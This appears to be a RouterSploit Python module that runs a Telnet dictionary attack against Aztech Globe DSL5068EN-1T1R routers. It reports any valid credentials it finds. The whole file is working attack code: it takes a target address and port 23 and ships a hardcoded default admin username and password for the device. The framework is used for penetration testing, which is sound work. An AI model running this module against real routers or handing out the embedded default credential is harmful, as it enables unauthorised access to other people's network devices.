from routersploit.core.exploit import *
from routersploit.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "Aztech Globe DSL5068EN-1T1R Router Default Telnet Creds",
        "description": "Module performs dictionary attack against Aztech Globe DSL5068EN-1T1R Router Telnet service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Aztech Globe DSL5068EN-1T1R Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:3UJUh2VemEfUtesEchEC2d2e", "User:Pass or file with default credentials (file://)")
